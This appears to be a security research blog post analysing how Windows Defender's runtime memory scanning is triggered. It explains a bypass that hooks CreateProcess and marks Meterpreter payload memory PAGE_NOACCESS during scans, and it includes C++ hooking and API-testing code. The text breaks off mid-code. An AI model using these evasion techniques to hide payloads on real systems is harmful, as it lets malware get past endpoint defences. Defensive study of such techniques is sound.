# https://labs.withsecure.com/publications/bypassing-windows-defender-runtime-scanning

<!DOCTYPE html><html lang="en">
	<body class="page basicpage" data-aos-easing="ease-out-back" data-aos-duration="800" data-aos-delay="0">
		
		



		<!-- Google Tag Manager for withsecure (noscript) -->

<!-- End Google Tag Manager withsecure (noscript) -->

<svg version="1.1" xmlns="http://www.w3.org/2000/svg" style="height: 0; display: block">
	<filter id="f-blue-clouds" color-interpolation-filters="sRGB" x="0" y="0" height="100%" width="100%">
		<feColorMatrix type="matrix" values=" 0.196  0.000  0.000  0.000 0.060
      0.274  0.000  0.000  0.000 0.060
      0.705  0.000  0.000  0.000 0.060
      0.000  0.000  0.000  1.000  0.000"></feColorMatrix>
	</filter>
	<filter id="f-arctic-mountain" color-interpolation-filters="sRGB" x="0" y="0" height="100%" width="100%">
		<feColorMatrix type="matrix" values=" 0.623  0.000  0.000  0.000  0.000
      0.466  0.000  0.000  0.000  0.000
      0.878  0.000  0.000  0.000  0.000
      0.000  0.000  0.000  1.000  0.000"></feColorMatrix>
	</filter>
	<filter id="f-sunset" color-interpolation-filters="sRGB" x="0" y="0" height="100%" width="100%">
		<feColorMatrix type="matrix" values=" 1.000  0.000  0.000  0.000  0.000
      0.439  0.000  0.000  0.000  0.000
      0.439  0.000  0.000  0.000  0.000
      0.000  0.000  0.000  1.000  0.000"></feColorMatrix>
	</filter>
	<filter id="f-grain-fields" color-interpolation-filters="sRGB" x="0" y="0" height="100%" width="100%">
		<feColorMatrix type="matrix" values=" 1.000  0.000  0.000  0.000  0.000
      0.725  0.000  0.000  0.000  0.000
      0.313  0.000  0.000  0.000  0.000
      0.000  0.000  0.000  1.000  0.000"></feColorMatrix>
	</filter>
	<filter id="f-deep-forest" color-interpolation-filters="sRGB" x="0" y="0" height="100%" width="100%">
		<feColorMatrix type="matrix" values=" 0.549  0.000  0.000  0.000  0.000
      0.705  0.000  0.000  0.000  0.000
      0.298  0.000  0.000  0.000  0.000
      0.000  0.000  0.000  1.000  0.000"></feColorMatrix>
	</filter>
	<filter id="f-northern-lights" color-interpolation-filters="sRGB" x="0" y="0" height="100%" width="100%">
		<feColorMatrix type="matrix" values=" 0.364  0.000  0.000  0.000  0.000
      0.788  0.000  0.000  0.000  0.000
      0.623  0.000  0.000  0.000  0.000
      0.000  0.000  0.000  1.000  0.000"></feColorMatrix>
	</filter>
	<filter id="f-blue-clouds-light" color-interpolation-filters="sRGB" x="0" y="0" height="100%" width="100%">
		<feColorMatrix type="matrix" values=" 0.776  0.000  0.000  0.000 0.000
      0.809  0.000  0.000  0.000 0.000
      1.000  0.000  0.000  0.000 0.000
      0.000  0.000  0.000  1.000  0.000"></feColorMatrix>
	</filter>
	<filter id="f-arctic-mountain-light" color-interpolation-filters="sRGB" x="0" y="0" height="100%" width="100%">
		<feColorMatrix type="matrix" values=" 0.847  0.000  0.000  0.000  0.000
      0.788  0.000  0.000  0.000  0.000
      0.945  0.000  0.000  0.000  0.000
      0.000  0.000  0.000  1.000  0.000"></feColorMatrix>
	</filter>
	<filter id="f-sunset-light" color-interpolation-filters="sRGB" x="0" y="0" height="100%" width="100%">
		<feColorMatrix type="matrix" values=" 1.000  0.000  0.000  0.000  0.000
      0.847  0.000  0.000  0.000  0.000
      0.847  0.000  0.000  0.000  0.000
      0.000  0.000  0.000  1.000  0.000"></feColorMatrix>
	</filter>
	<filter id="f-grain-fields-light" color-interpolation-filters="sRGB" x="0" y="0" height="100%" width="100%">
		<feColorMatrix type="matrix" values=" 1.000  0.000  0.000  0.000  0.000
      0.945  0.000  0.000  0.000  0.000
      0.824  0.000  0.000  0.000  0.000
      0.000  0.000  0.000  1.000  0.000"></feColorMatrix>
	</filter>
	<filter id="f-deep-forest-light" color-interpolation-filters="sRGB" x="0" y="0" height="100%" width="100%">
		<feColorMatrix type="matrix" values=" 0.859  0.000  0.000  0.000  0.000
      0.922  0.000  0.000  0.000  0.000
      0.761  0.000  0.000  0.000  0.000
      0.000  0.000  0.000  1.000  0.000"></feColorMatrix>
	</filter>
	<filter id="f-northern-lights-light" color-interpolation-filters="sRGB" x="0" y="0" height="100%" width="100%">
		<feColorMatrix type="matrix" values=" 0.784  0.000  0.000  0.000  0.000
      0.953  0.000  0.000  0.000  0.000
      0.890  0.000  0.000  0.000  0.000
      0.000  0.000  0.000  1.000  0.000"></feColorMatrix>
	</filter>
</svg>



	
		
			<div class="header-ref-black"><div class="cq-dd-paragraph"><div class="businessheader businessHeader parbase section-two">

</div>
</div>
</div>
		
		
			<div class="header-ref-white"><div class="cq-dd-paragraph"><div class="businessheader_copy businessHeader parbase header-white-background">

</div>
</div>
</div>
		
	
	




<div class="container">
	<div class="root responsivegrid">


<div class="aem-Grid aem-Grid--12 aem-Grid--default--12 ">
    
    <div class="businessHeader parbase aem-GridColumn aem-GridColumn--default--12">

</div>
<div class="responsivegrid aem-GridColumn aem-GridColumn--default--12">


<div class="aem-Grid aem-Grid--12 aem-Grid--default--12 ">
    
    <div class="responsivegrid aem-GridColumn aem-GridColumn--default--12">


<div class="aem-Grid aem-Grid--12 aem-Grid--default--12 ">
    
    <div class="responsivegrid main-content aem-GridColumn aem-GridColumn--default--12">


<div class="aem-Grid aem-Grid--12 aem-Grid--default--12 ">
    
    <div class="hero b2b wsbg bc theme-bc aem-GridColumn aem-GridColumn--default--12">
	
	
	
	
	
	
	
	
	
	<div id="hero-212842695" class="hero b2b wsbg-spot width-full    " role="banner" aria-label="Hero banner: Bypassing Windows Defender Runtime Scanning">
		<div class="container hero-container">
			<div data-aos-delay="800">
				
				
				<h1 class="title">
					Bypassing Windows Defender Runtime Scanning
				</h1>
				<p>By Charalampos Billinis on 1 May, 2020</p>

				
				
				<div class="btn-wrapper">
					
					
				</div>
			</div>
		</div>
		
		
		
		
	<canvas data-engine="three.js r156" width="1280" height="51" style="display: block; width: 1280px; height: 51.5254px;"></canvas></div>
	

    
</div>
<div class="customContainer parbase aem-GridColumn aem-GridColumn--default--12">






	<div id="container-1046877295" class="wsbg-spot container-1046877295  image-div">
		
		<div class="custom-container container">
			


<div class="aem-Grid aem-Grid--12 aem-Grid--default--12 aem-Grid--xs--12 authorWidgetParentContainer stickyParent0">
    
    <div class="customContainer parbase aem-GridColumn--offset--xs--1 aem-GridColumn--default--none aem-GridColumn aem-GridColumn--xs--9 aem-GridColumn--xs--none aem-GridColumn--offset--default--0 aem-GridColumn--default--4 authorWidgetContainer0">






	<div id="container-3412078076" class="wsbg-spot container-3412078076 image-div authorWidget0">
		
		<div class="custom-container container">
			


<div class="aem-Grid aem-Grid--4 aem-Grid--default--4 aw-smooth">
    
    <div class="authorWidget parbase aem-GridColumn--default--none aem-GridColumn aem-GridColumn--offset--default--0 aem-GridColumn--default--4 sticky">



<div class="author-widget-wrapper is-sticky">
	
		
		
		<div class="author-widget-section author-widget-navi p-t-0 p-l-0">
			
			
				<div>



<div class="progressbar-content published" id="progressbar-218134619">
	<div class="progressbar-line " id="progressbar"></div>
	<div class="jump-container container" id="jump-container" style="width: 100%;">
		<div class="jt-tabs-wrapper" style="width: 100%;">
			<div class="jt-left">
				
			</div>
			
			
		</div>
		<div class="jt-menu-toggle invisible" aria-label="Menu" aria-controls="jt-tabs"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 32 35" width="32" height="35" preserveAspectRatio="xMidYMid meet" style="width: 100%; height: 100%; transform: translate3d(0px, 0px, 0px); content-visibility: visible;"><defs><clipPath id="__lottie_element_19"><rect width="32" height="35" x="0" y="0"></rect></clipPath><clipPath id="__lottie_element_21"><path d="M0,0 L32,0 L32,35 L0,35z"></path></clipPath><clipPath id="__lottie_element_34"><path d="M0,0 L32,0 L32,35 L0,35z"></path></clipPath></defs><g clip-path="url(#__lottie_element_19)"><g clip-path="url(#__lottie_element_34)" transform="matrix(1,0,0,1,0,0)" opacity="1" style="display: block;"><g transform="matrix(1.0321400165557861,0,0,2.4737699031829834,8.321077346801758,15.179876327514648)" opacity="1" style="display: block;"><g opacity="1" transform="matrix(1,0,0,1,-0.03099999949336052,4.5)"><path fill="rgb(0,20,35)" fill-opacity="1" d=" M8.031000137329102,-0.9375 C8.031000137329102,-0.9375 8.031000137329102,0.9375 8.031000137329102,0.9375 C8.031000137329102,0.9375 -8.031000137329102,0.9375 -8.031000137329102,0.9375 C-8.031000137329102,0.9375 -8.031000137329102,-0.9375 -8.031000137329102,-0.9375 C-8.031000137329102,-0.9375 8.031000137329102,-0.9375 8.031000137329102,-0.9375z"></path></g></g><g transform="matrix(-2.490910053253174,0,0,1.932629942893982,14.862268447875977,34.642765045166016)" opacity="1" style="display: block;"><g opacity="1" transform="matrix(1,0,0,1,-3,-4.218999862670898)"><path fill="rgb(0,20,35)" fill-opacity="1" d=" M0.9375,-4.343999862670898 C0.9375,-4.343999862670898 0.9375,4.343999862670898 0.9375,4.343999862670898 C0.9375,4.343999862670898 -0.9375,4.343999862670898 -0.9375,4.343999862670898 C-0.9375,4.343999862670898 -0.9375,-4.343999862670898 -0.9375,-4.343999862670898 C-0.9375,-4.343999862670898 0.9375,-4.343999862670898 0.9375,-4.343999862670898z"></path></g></g><g transform="matrix(0.6116999983787537,0,0,2.466670036315918,27.044418334960938,15.213583946228027)" opacity="1" style="display: block;"><g opacity="1" transform="matrix(1,0,0,1,-0.03099999949336052,4.5)"><path fill="rgb(0,20,35)" fill-opacity="1" d=" M8.031000137329102,-0.9375 C8.031000137329102,-0.9375 8.031000137329102,0.9375 8.031000137329102,0.9375 C8.031000137329102,0.9375 -8.031000137329102,0.9375 -8.031000137329102,0.9375 C-8.031000137329102,0.9375 -8.031000137329102,-0.9375 -8.031000137329102,-0.9375 C-8.031000137329102,-0.9375 8.031000137329102,-0.9375 8.031000137329102,-0.9375z"></path></g></g></g><g clip-path="url(#__lottie_element_21)" transform="matrix(-1,0,0,-1,32,35)" opacity="1" style="display: block;"><g transform="matrix(1.0321400165557861,0,0,2.4737699031829834,8.321077346801758,15.179876327514648)" opacity="1" style="display: block;"><g opacity="1" transform="matrix(1,0,0,1,-0.03099999949336052,4.5)"><path fill="rgb(0,20,35)" fill-opacity="1" d=" M8.031000137329102,-0.9375 C8.031000137329102,-0.9375 8.031000137329102,0.9375 8.031000137329102,0.9375 C8.031000137329102,0.9375 -8.031000137329102,0.9375 -8.031000137329102,0.9375 C-8.031000137329102,0.9375 -8.031000137329102,-0.9375 -8.031000137329102,-0.9375 C-8.031000137329102,-0.9375 8.031000137329102,-0.9375 8.031000137329102,-0.9375z"></path></g></g><g transform="matrix(-2.490910053253174,0,0,1.932629942893982,14.862268447875977,34.642765045166016)" opacity="1" style="display: block;"><g opacity="1" transform="matrix(1,0,0,1,-3,-4.218999862670898)"><path fill="rgb(0,20,35)" fill-opacity="1" d=" M0.9375,-4.343999862670898 C0.9375,-4.343999862670898 0.9375,4.343999862670898 0.9375,4.343999862670898 C0.9375,4.343999862670898 -0.9375,4.343999862670898 -0.9375,4.343999862670898 C-0.9375,4.343999862670898 -0.9375,-4.343999862670898 -0.9375,-4.343999862670898 C-0.9375,-4.343999862670898 0.9375,-4.343999862670898 0.9375,-4.343999862670898z"></path></g></g><g transform="matrix(0.6116999983787537,0,0,2.466670036315918,27.044418334960938,15.213583946228027)" opacity="1" style="display: block;"><g opacity="1" transform="matrix(1,0,0,1,-0.03099999949336052,4.5)"><path fill="rgb(0,20,35)" fill-opacity="1" d=" M8.031000137329102,-0.9375 C8.031000137329102,-0.9375 8.031000137329102,0.9375 8.031000137329102,0.9375 C8.031000137329102,0.9375 -8.031000137329102,0.9375 -8.031000137329102,0.9375 C-8.031000137329102,0.9375 -8.031000137329102,-0.9375 -8.031000137329102,-0.9375 C-8.031000137329102,-0.9375 8.031000137329102,-0.9375 8.031000137329102,-0.9375z"></path></g></g></g></g></svg></div>
	</div>
</div>

    

</div>
			
		</div>
	
	
	<div class="author-widget-section author-widget-details">
		
		
		<h5 class="author-name m-t-0 m-b-2">Charalampos Billinis</h5>
		<div class="author-details"><p>1 May, 2020</p>
</div>
	</div>
	<div class="author-widget-section author-widget-share">
		
		
	</div>
</div>

    

</div>

    
</div>

		</div>
	</div>

</div>
<div class="customContainer parbase aem-GridColumn--xs--newline aem-GridColumn--default--none aem-GridColumn--offset--xs--0 aem-GridColumn aem-GridColumn--default--8 aem-GridColumn--offset--default--0 aem-GridColumn--xs--12">






	<div id="container-1707439061" class="wsbg-spot container-1707439061  image-div">
		
		<div class="custom-container container">
			


<div class="aem-Grid aem-Grid--8 aem-Grid--default--8 ">
    
    <div class="responsivegrid aem-GridColumn--default--none aem-GridColumn aem-GridColumn--default--8 aem-GridColumn--offset--default--0 aw-smooth">


<div class="aem-Grid aem-Grid--8 aem-Grid--default--8 ">
    
    <div class="anchor aem-GridColumn aem-GridColumn--default--8"><div class="cmp-anchor cmp-anchor--offset" id="part1"></div>

    


</div>
<div class="title parbase aem-GridColumn aem-GridColumn--default--8">
	<h3 class="cmp-title__text grey-text">
		Introduction
	</h3>

    
</div>
<div class="businessRichtext parbase aem-GridColumn aem-GridColumn--default--8">
	<p>Windows Defender is enabled by default in all modern versions of Windows making it an important mitigation for defenders and a potential target for attackers. While Defender has significantly improved in recent years it still relies on age-old AV techniques that are often trivial to bypass. In this post we’ll analyse some of those techniques and examine potential ways they can be bypassed.</p>


	
    


</div>

    
</div>
</div>
<div class="space aem-GridColumn aem-GridColumn--default--8">
	<div class="cmp-space  "></div>


    

</div>
<div class="responsivegrid aem-GridColumn--default--none aem-GridColumn aem-GridColumn--default--8 aem-GridColumn--offset--default--0">


<div class="aem-Grid aem-Grid--8 aem-Grid--default--8 ">
    
    <div class="anchor aem-GridColumn aem-GridColumn--default--8"><div class="cmp-anchor cmp-anchor--offset" id="part2"></div>

    


</div>
<div class="title parbase aem-GridColumn aem-GridColumn--default--8">
	<h3 class="cmp-title__text grey-text">
		Antivirus 101
	</h3>

    
</div>
<div class="businessRichtext parbase aem-GridColumn aem-GridColumn--default--8">
	<p>Before diving into Windows Defender we wanted to quickly introduce the main analysis methods used by most modern AV engines:</p>
<p><b>Static Analysis</b>&nbsp;– Involves scanning the contents of a file on disk and will primarily rely on a set of known bad signatures. While this is effective against known malware, static signatures are often easy to bypass meaning new malware is missed. A newer variation of this technique is machine learning based file classification which essentially compares static features against known good and bad profiles to detect anomalous files.</p>
<p><b>Process Memory/Runtime Analysis</b>&nbsp;– Similar to the static analysis except running process memory is analysed instead of files on disk. This can be more challenging for attackers as it can be harder to obfuscate code in memory as its executing and off the shelf payloads are easily detected.</p>
<p>It’s also worth mentioning how scans can be triggered:</p>
<p><b>File Read/Write</b>&nbsp;– Whenever a new file is created or modified this can potentially trigger the AV and cause it to initiate a scan of the file.</p>
<p><b>Periodic</b>&nbsp;– AV will periodically scan systems, daily or weekly scans are common and this can involve all or just a subset of the files on the system. This concept also applies to scanning the memory of running processes.</p>
<p><b>Suspicious Behaviour</b>&nbsp;– AV will often monitor for suspicious behaviour (usually API calls) and use this to trigger a scan, again this could be of local files or process memory.</p>
<p>In the next few sections we’ll discuss potential bypass techniques in more detail.</p>


	
    


</div>

    
</div>
</div>
<div class="space aem-GridColumn aem-GridColumn--default--8">
	<div class="cmp-space  "></div>


    

</div>
<div class="responsivegrid aem-GridColumn--default--none aem-GridColumn aem-GridColumn--default--8 aem-GridColumn--offset--default--0">


<div class="aem-Grid aem-Grid--8 aem-Grid--default--8 ">
    
    <div class="anchor aem-GridColumn aem-GridColumn--default--8"><div class="cmp-anchor cmp-anchor--offset" id="part3"></div>

    


</div>
<div class="title parbase aem-GridColumn aem-GridColumn--default--8">
	<h3 class="cmp-title__text grey-text">
		Bypassing Static Analysis With a Custom Crypter
	</h3>

    
</div>
<div class="businessRichtext parbase aem-GridColumn aem-GridColumn--default--8">
	<p>One of the most well-documented and easiest ways to bypass static analysis is to encrypt your payload and decrypt it upon execution. This works by creating a unique payload every time rendering static file signatures ineffective. There are multiple open source projects which demonstrate this (Veil, Hyperion, PE-Crypter etc.) however we also wanted to test memory injection techniques so wrote a custom crypter to incorporate them in the same payload.</p>
<p>The crypter would take a “stub“ to decrypt, load and execute our payload and the malicious payload itself. Passing these through our crypter would combine them together into our final payload which we can execute on our target.</p>


	
    


</div>
<div class="image aem-GridColumn aem-GridColumn--default--8"><div data-cmp-is="image" data-cmp-widths="480,768,992,1280,1920" data-cmp-src="/adobe/dynamicmedia/deliver/dm-aid--c730d3b9-6ae8-44e7-a6bb-836959ac8259/picture1.png?width={width}&amp;preferwebp=true&amp;quality=82" data-asset-id="c730d3b9-6ae8-44e7-a6bb-836959ac8259" data-cmp-filereference="/content/dam/labs/images/Picture1.png" id="image-861672ee26" data-cmp-hook-image="imageV3" class="cmp-image" itemscope="" itemtype="http://schema.org/ImageObject">
    
        <img src="https://labs.withsecure.com/adobe/dynamicmedia/deliver/dm-aid--c730d3b9-6ae8-44e7-a6bb-836959ac8259/picture1.png?preferwebp=true&amp;quality=82" loading="lazy" class="cmp-image__image" itemprop="contentUrl" width="600" height="304" alt="">
    
    
    
</div>

    

</div>
<div class="businessRichtext parbase aem-GridColumn aem-GridColumn--default--8">
	<p>The proof of concept we created included support for a number of different injection techniques that are useful to test against AVs including local/remote shellcode injection, process hollowing and reflective loading. Parameters for these techniques were passed in the stub options.</p>
<p>All of the above techniques were able to bypass Windows Defender’s static file scan when using a standard Metasploit Meterpreter payload. However, despite execution succeeding we found that Windows Defender would still kill the Meterpreter session when commands such as shell/execute were used. But why?&nbsp;</p>


	
    


</div>

    
</div>
</div>
<div class="space aem-GridColumn aem-GridColumn--default--8">
	<div class="cmp-space  "></div>


    

</div>
<div class="responsivegrid aem-GridColumn--default--none aem-GridColumn aem-GridColumn--default--8 aem-GridColumn--offset--default--0">


<div class="aem-Grid aem-Grid--8 aem-Grid--default--8 ">
    
    <div class="anchor aem-GridColumn aem-GridColumn--default--8"><div class="cmp-anchor cmp-anchor--offset" id="part4"></div>

    


</div>
<div class="title parbase aem-GridColumn aem-GridColumn--default--8">
	<h3 class="cmp-title__text grey-text">
		Analysing Runtime Analysis
	</h3>

    
</div>
<div class="businessRichtext parbase aem-GridColumn aem-GridColumn--default--8">
	<p>As mentioned earlier in this post memory scanning can be periodic or “triggered” by specific activity. Given that our Meterpreter session was only killed when shell/execute was used it seemed likely this activity was triggering a scan.</p>
<p>To try and understand this behaviour we examined the Metasploit source code and found that Meterpreter used the&nbsp;<a href="https://github.com/rapid7/metasploit-payloads/blob/master/c/meterpreter/source/extensions/stdapi/server/sys/process/process.c#L453">CreateProcess API to launch new processes</a>.&nbsp;</p>


	
    


</div>
<div class="space aem-GridColumn aem-GridColumn--default--8">
	<div class="cmp-space  "></div>


    

</div>
<div class="codeBlock parbase aem-GridColumn aem-GridColumn--default--8">
<div>
	<pre><code class="dark hljs language-objectivec"><span class="hljs-comment dark">// Try to execute the process</span>
<span class="hljs-keyword dark">if</span> (!CreateProcess(<span class="hljs-literal dark">NULL</span>, commandLine, <span class="hljs-literal dark">NULL</span>, <span class="hljs-literal dark">NULL</span>, inherit, createFlags, <span class="hljs-literal dark">NULL</span>, <span class="hljs-literal dark">NULL</span>, (STARTUPINFOA*)&amp;si, &amp;pi))
{
result = GetLastError();
<span class="hljs-keyword dark">break</span>;
}</code></pre>
</div>
</div>
<div class="space aem-GridColumn aem-GridColumn--default--8">
	<div class="cmp-space  "></div>


    

</div>
<div class="businessRichtext parbase aem-GridColumn aem-GridColumn--default--8">
	<p>Inspecting the arguments of CreateProcess and the code around it, nothing suspicious could be found. Debugging and stepping through the code also didn’t reveal any userland hooks, but once the syscall is executed on the 5th line, Windows Defender would find and kill the Meterpreter session.</p>


	
    


</div>
<div class="image aem-GridColumn aem-GridColumn--default--8"><div data-cmp-is="image" data-cmp-widths="480,768,992,1280,1920" data-cmp-src="/adobe/dynamicmedia/deliver/dm-aid--1322f829-bff8-4b60-9c69-24e0a422a799/picture5.png?width={width}&amp;preferwebp=true&amp;quality=82" data-asset-id="1322f829-bff8-4b60-9c69-24e0a422a799" data-cmp-filereference="/content/dam/labs/images/Picture5.png" id="image-032d1bcd11" data-cmp-hook-image="imageV3" class="cmp-image" itemscope="" itemtype="http://schema.org/ImageObject">
    
        <img src="https://labs.withsecure.com/adobe/dynamicmedia/deliver/dm-aid--1322f829-bff8-4b60-9c69-24e0a422a799/picture5.png?preferwebp=true&amp;quality=82" loading="lazy" class="cmp-image__image" itemprop="contentUrl" width="600" height="102" alt="">
    
    
    
</div>

    

</div>
<div class="businessRichtext parbase aem-GridColumn aem-GridColumn--default--8">
	<p>This suggested that Windows Defender was logging activity from the Kernel and would trigger a scan of process memory when specific APIs were called. To validate this hypothesis we wrote some custom code to call potentially suspicious API functions and then measure whether Windows Defender was triggered and would kill the Meterpreter session.</p>


	
    


</div>
<div class="space aem-GridColumn aem-GridColumn--default--8">
	<div class="cmp-space  "></div>


    

</div>
<div class="codeBlock parbase aem-GridColumn aem-GridColumn--default--8">
<div>
	<pre><code class="dark hljs language-scss">VOID <span class="hljs-built_in dark">detectMe</span>() {
std::vector&lt;<span class="hljs-built_in dark">BOOL</span>(*)()&gt;* funcs = new std::vector&lt;<span class="hljs-built_in dark">BOOL</span>(*)()&gt;();

funcs-&gt;<span class="hljs-built_in dark">push_back</span>(virtualAllocEx);
funcs-&gt;<span class="hljs-built_in dark">push_back</span>(loadLibrary);
funcs-&gt;<span class="hljs-built_in dark">push_back</span>(createRemoteThread);
funcs-&gt;<span class="hljs-built_in dark">push_back</span>(openProcess);
funcs-&gt;<span class="hljs-built_in dark">push_back</span>(writeProcessMemory);
funcs-&gt;<span class="hljs-built_in dark">push_back</span>(openProcessToken);
funcs-&gt;<span class="hljs-built_in dark">push_back</span>(openProcess2);
funcs-&gt;<span class="hljs-built_in dark">push_back</span>(createRemoteThreadSuspended);
funcs-&gt;<span class="hljs-built_in dark">push_back</span>(createEvent);
funcs-&gt;<span class="hljs-built_in dark">push_back</span>(duplicateHandle);
funcs-&gt;<span class="hljs-built_in dark">push_back</span>(createProcess);

for (int i = <span class="hljs-number dark">0</span>; i &lt; funcs-&gt;size(); <span class="hljs-selector-tag dark">i</span>++) {
<span class="hljs-built_in dark">printf</span>("[!] Executing func at index %d ", i);

if (!funcs-&gt;at(i)()) {
<span class="hljs-built_in dark">printf</span>(" Failed, %d", GetLastError());
}

<span class="hljs-built_in dark">Sleep</span>(<span class="hljs-number dark">7000</span>);
<span class="hljs-built_in dark">printf</span>(" Passed OK!\n");
}
}</code></pre>
</div>
</div>
<div class="space aem-GridColumn aem-GridColumn--default--8">
	<div class="cmp-space  "></div>


    

</div>
<div class="businessRichtext parbase aem-GridColumn aem-GridColumn--default--8">
	<p>Interestingly most test functions did not trigger a scan event, only CreateProcess and CreateRemoteThread resulted in a scan being triggered. This perhaps made sense as many of the APIs tested are frequently used, if a scan was triggered every time one of them was called Windows Defender would be constantly scanning and may impact system performance.</p>


	
    


</div>

    
</div>
</div>
<div class="space aem-GridColumn aem-GridColumn--default--8">
	<div class="cmp-space  "></div>


    

</div>
<div class="responsivegrid aem-GridColumn--default--none aem-GridColumn aem-GridColumn--default--8 aem-GridColumn--offset--default--0">


<div class="aem-Grid aem-Grid--8 aem-Grid--default--8 ">
    
    <div class="anchor aem-GridColumn aem-GridColumn--default--8"><div class="cmp-anchor cmp-anchor--offset" id="part5"></div>

    


</div>
<div class="title parbase aem-GridColumn aem-GridColumn--default--8">
	<h3 class="cmp-title__text grey-text">
		Bypassing Windows Defender’s Runtime Analysis
	</h3>

    
</div>
<div class="businessRichtext parbase aem-GridColumn aem-GridColumn--default--8">
	<p>After confirming Windows Defender memory scanning was being triggered by specific APIs, the next question was how can we bypass it? One simple approach would be to avoid the APIs that trigger Windows Defender’s runtime scanner but that would mean manually rewriting Metasploit payloads which is far too much effort. Another option would be to obfuscate the code in memory, either by adding/modifying instructions or dynamically encrypting/decrypting our payload in memory when a scan a detected. But is there another way?</p>
<p>Well one thing that works in an attacker’s favour is that the virtual memory space of processes is huge being 2 GB in 32 bits and 128 TB in 64 bits. As such AVs won’t typically scan the whole virtual memory space of a process and instead look for specific page allocations or permissions, for example MEM_PRIVATE or RWX page permissions. Reading through the Microsoft documentation though you’ll see one permission in particular that is quite interesting for us, PAGE_NOACCESS. This “Disables all access to the committed region of pages. An attempt to read from, write to, or execute the committed region results in an access violation.” which is exactly the kind of behaviour we are looking for. And quick tests confirmed that Windows Defender would not scan pages with this permission, awesome we have a potential bypass!</p>
<p>To weaponize this we’d just need to dynamically set PAGE_NOACCESS memory permissions whenever a suspicious API was called (as that would trigger a scan) then revert it back once the scan is done. The only tricky bit here is we’d need to add hooks for any suspicious calls to make sure we can set permissions before the scan is triggered.</p>
<p>Bringing this all together, we’d need to:</p>
<ol><li>Install hooks to detect when a Windows Defender trigger function (CreateProcess) is called</li><li>When CreateProcess is called the hook is triggered and Meterpreter thread is suspended</li><li>Set payload memory permissions to PAGE_NOACCESS</li><li>Wait for scan to finish</li><li>Set permission back to RWX</li><li>Resume the thread and continue execution</li></ol>
<p>We’ll walk through the code for this in the next section.</p>


	
    


</div>

    
</div>
</div>
<div class="space aem-GridColumn aem-GridColumn--default--8">
	<div class="cmp-space  "></div>


    

</div>
<div class="responsivegrid aem-GridColumn--default--none aem-GridColumn aem-GridColumn--default--8 aem-GridColumn--offset--default--0">


<div class="aem-Grid aem-Grid--8 aem-Grid--default--8 ">
    
    <div class="anchor aem-GridColumn aem-GridColumn--default--8"><div class="cmp-anchor cmp-anchor--offset" id="part6"></div>

    


</div>
<div class="title parbase aem-GridColumn aem-GridColumn--default--8">
	<h3 class="cmp-title__text grey-text">
		Digging into the hooking code
	</h3>

    
</div>
<div class="businessRichtext parbase aem-GridColumn aem-GridColumn--default--8">
	<p>We started by creating a function installHook which would take the address of CreateProcess as well as the address of our hook as input then update one with the other.</p>


	
    


</div>
<div class="space aem-GridColumn aem-GridColumn--default--8">
	<div class="cmp-space  "></div>


    

</div>
<div class="codeBlock parbase aem-GridColumn aem-GridColumn--default--8">
<div>
	<pre><code class="dark hljs language-ini"><span class="hljs-attr dark">CreateProcessInternalW</span> = (PCreateProcessInternalW)GetProcAddress(GetModuleHandle(L<span class="hljs-string dark">"KERNELBASE.dll"</span>), <span class="hljs-string dark">"CreateProcessInternalW"</span>)<span class="hljs-comment dark">;</span>
<span class="hljs-attr dark">CreateProcessInternalW</span> = (PCreateProcessInternalW)GetProcAddress(GetModuleHandle(L<span class="hljs-string dark">"kernel32.dll"</span>), <span class="hljs-string dark">"CreateProcessInternalW"</span>)<span class="hljs-comment dark">;</span>
<span class="hljs-attr dark">hookResult</span> = installHook(CreateProcessInternalW, hookCreateProcessInternalW, <span class="hljs-number dark">5</span>)<span class="hljs-comment dark">;</span></code></pre>
</div>
</div>
<div class="space aem-GridColumn aem-GridColumn--default--8">
	<div class="cmp-space  "></div>


    

</div>
<div class="businessRichtext parbase aem-GridColumn aem-GridColumn--default--8">
	<p>Inside the installHook function you’ll see we save the current state of the memory then replace the memory at the CreateProcess address with a JMP instruction to our hook so when CreateProcess is called our code will be called instead. A restoreHook function was also created to do the reverse.&nbsp;</p>


	
    


</div>
<div class="space aem-GridColumn aem-GridColumn--default--8">
	<div class="cmp-space  "></div>


    

</div>
<div class="codeBlock parbase aem-GridColumn aem-GridColumn--default--8">
<div>
	<pre><code class="dark hljs language-lua">LPHOOK_RESULT installHook(LPVOID hookFunAddr, LPVOID jmpAddr, SIZE_T <span class="hljs-built_in dark">len</span>) {
<span class="hljs-keyword dark">if</span> (<span class="hljs-built_in dark">len</span> &lt; <span class="hljs-number dark">5</span>) {
<span class="hljs-keyword dark">return</span> NULL;
}

DWORD currProt;


LPBYTE originalData = (LPBYTE)HeapAlloc(GetProcessHeap(), HEAP_GENERATE_EXCEPTIONS, <span class="hljs-built_in dark">len</span>);
CopyMemory(originalData, hookFunAddr, <span class="hljs-built_in dark">len</span>);

LPHOOK_RESULT hookResult = (LPHOOK_RESULT)HeapAlloc(GetProcessHeap(), HEAP_GENERATE_EXCEPTIONS, sizeof(HOOK_RESULT));

hookResult-&gt;hookFunAddr = hookFunAddr;
hookResult-&gt;jmpAddr = jmpAddr;
hookResult-&gt;<span class="hljs-built_in dark">len</span> = <span class="hljs-built_in dark">len</span>;
hookResult-&gt;free = FALSE;

hookResult-&gt;originalData = originalData;

VirtualProtect(hookFunAddr, <span class="hljs-built_in dark">len</span>, PAGE_EXECUTE_READWRITE, &amp;currProt);

memset(hookFunAddr, <span class="hljs-number dark">0x90</span>, <span class="hljs-built_in dark">len</span>);

SIZE_T relativeAddress = ((SIZE_T)jmpAddr - (SIZE_T)hookFunAddr) - <span class="hljs-number dark">5</span>;

*(LPBYTE)hookFunAddr = <span class="hljs-number dark">0xE9</span>;
*(PSIZE_T)((SIZE_T)hookFunAddr + <span class="hljs-number dark">1</span>) = relativeAddress;

DWORD temp;
VirtualProtect(hookFunAddr, <span class="hljs-built_in dark">len</span>, currProt, &amp;temp);

printf(<span class="hljs-string dark">"Hook installed at address: %02uX\n"</span>, (SIZE_T)hookFunAddr);

<span class="hljs-keyword dark">return</span> hookResult;
}</code></pre>
</div>
</div>
<div class="space aem-GridColumn aem-GridColumn--default--8">
	<div class="cmp-space  "></div>


    

</div>
<div class="codeBlock parbase aem-GridColumn aem-GridColumn--default--8">
<div>
	<pre><code class="dark hljs language-scss">BOOL <span class="hljs-built_in dark">restoreHook</span>(LPHOOK_RESULT hookResult) {
if (!hookResult) return FALSE;

DWORD currProt;

<span class="hljs-built_in dark">VirtualProtect</span>(hookResult-&gt;hookFunAddr, hookResult-&gt;len, PAGE_EXECUTE_READWRITE, &amp;currProt);

